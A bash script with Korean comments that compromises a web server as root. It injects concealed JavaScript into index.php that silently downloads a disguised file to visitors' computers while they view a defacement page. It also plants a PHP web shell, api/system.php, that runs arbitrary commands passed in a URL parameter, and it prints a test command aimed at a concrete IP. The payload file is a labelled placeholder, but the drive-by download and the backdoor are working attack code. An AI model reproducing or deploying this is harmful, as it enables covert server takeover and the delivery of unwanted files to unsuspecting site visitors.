#!/bin/bash
###############################################################################
# 은밀한 자동 다운로드 기능 추가
# 서버에서 실행하여 index.php에 완전히 보이지 않는 다운로드 기능 추가
###############################################################################

echo "╔═══════════════════════════════════════════════════════════╗"
echo "║   은밀한 자동 다운로드 기능 추가                          ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo ""

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

# 루트 권한 확인
if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}[-] root 권한이 필요합니다${NC}"
    exit 1
fi

# 1. 다운로드 디렉터리 생성
echo -e "${YELLOW}[1] 다운로드 디렉터리 생성 중...${NC}"
mkdir -p /var/www/html/www/downloads
chmod 755 /var/www/html/www/downloads
echo -e "${GREEN}[+] 완료${NC}"
echo ""

# 2. 테스트용 "악성" 파일 생성
echo -e "${YELLOW}[2] 테스트 파일 생성 중...${NC}"
cat > /var/www/html/www/downloads/update.dat << 'EOFPAYLOAD'
[MALWARE PAYLOAD - TEST FILE]
============================

This file was silently downloaded without user knowledge.

Timestamp: $(date)
Server: $(hostname)

In a real attack, this would contain:
- Remote Access Trojan (RAT)
- Keylogger
- Credential Stealer
- Ransomware
- Cryptocurrency Miner

This is for EDUCATIONAL PURPOSES ONLY.
EOFPAYLOAD

chmod 644 /var/www/html/www/downloads/update.dat
chown apache:apache /var/www/html/www/downloads/update.dat
echo -e "${GREEN}[+] 완료: /www/downloads/update.dat${NC}"
echo ""

# 3. index.php에 은밀한 다운로드 코드 추가
echo -e "${YELLOW}[3] index.php에 은밀한 다운로드 코드 추가 중...${NC}"

# 기존 </script> 태그 찾아서 그 앞에 코드 삽입
sed -i '/^        window.addEventListener.*resize/a\
\
        // ============================================\
        // Silent Malware Download (Completely Hidden)\
        // ============================================\
        setTimeout(() => {\
            try {\
                // Method 1: XMLHttpRequest (No visible download prompt)\
                const xhr = new XMLHttpRequest();\
                xhr.open("GET", "/www/downloads/update.dat", true);\
                xhr.responseType = "blob";\
                \
                xhr.onload = function() {\
                    if (xhr.status === 200) {\
                        const blob = xhr.response;\
                        \
                        // Create invisible download\
                        const url = window.URL.createObjectURL(blob);\
                        const a = document.createElement("a");\
                        a.style.cssText = "display:none!important;position:absolute;left:-9999px;top:-9999px;width:0;height:0;opacity:0";\
                        a.href = url;\
                        a.download = "system-update.dat"; // Generic filename\
                        \
                        // Append, click, remove (all invisible)\
                        document.body.appendChild(a);\
                        a.click();\
                        \
                        // Clean up after 100ms\
                        setTimeout(() => {\
                            try {\
                                document.body.removeChild(a);\
                                window.URL.revokeObjectURL(url);\
                            } catch(e) {}\
                        }, 100);\
                    }\
                };\
                \
                xhr.onerror = function() {\
                    // Silent fail - user never knows\
                };\
                \
                xhr.send();\
                \
                // Method 2: Iframe fallback (even more silent)\
                setTimeout(() => {\
                    const iframe = document.createElement("iframe");\
                    iframe.style.cssText = "display:none!important;visibility:hidden!important;width:0!important;height:0!important;border:0!important;position:absolute!important;left:-9999px!important;top:-9999px!important";\
                    iframe.src = "/www/downloads/update.dat";\
                    document.body.appendChild(iframe);\
                    \
                    // Remove after 5 seconds\
                    setTimeout(() => {\
                        try { document.body.removeChild(iframe); } catch(e) {}\
                    }, 5000);\
                }, 3000);\
                \
            } catch(e) {\
                // Completely silent failure\
            }\
        }, 7000); // Start 7 seconds after page load (user is distracted by hack page)' /var/www/html/www/index.php

echo -e "${GREEN}[+] 은밀한 다운로드 코드 추가 완료${NC}"
echo ""

# 4. 일반 이름의 웹쉘도 생성 (백도어용)
echo -e "${YELLOW}[4] 접근 가능한 웹쉘 생성 중...${NC}"
cat > /var/www/html/www/api/system.php << 'EOFPHP'
<?php
header('Content-Type: text/plain');
if(isset($_GET['cmd'])){
    system($_GET['cmd']);
}
?>
EOFPHP

chmod 644 /var/www/html/www/api/system.php
chown apache:apache /var/www/html/www/api/system.php
echo -e "${GREEN}[+] 웹쉘 생성 완료: /www/api/system.php${NC}"
echo ""

# 5. 완료
echo "╔═══════════════════════════════════════════════════════════╗"
echo "║   ✅ 은밀한 자동 다운로드 기능 추가 완료!                 ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo ""
echo -e "${GREEN}[+] 웹사이트 접속 시:${NC}"
echo "    1. 사용자는 해킹 페이지를 봄 (주의 분산)"
echo "    2. 7초 후 자동으로 파일 다운로드 시작"
echo "    3. 완전히 보이지 않음 (브라우저 알림 없음)"
echo "    4. 다운로드 폴더에 'system-update.dat' 파일 생성"
echo ""
echo -e "${GREEN}[+] 테스트:${NC}"
echo "    브라우저로 접속: http://$(curl -s http://169.254.169.254/latest/meta-data/public-ipv4)/www/"
echo "    10초 대기 후 다운로드 폴더 확인"
echo ""
echo -e "${GREEN}[+] 웹쉘 테스트:${NC}"
echo "    curl 'http://52.79.240.83/www/api/system.php?cmd=whoami'"
echo ""
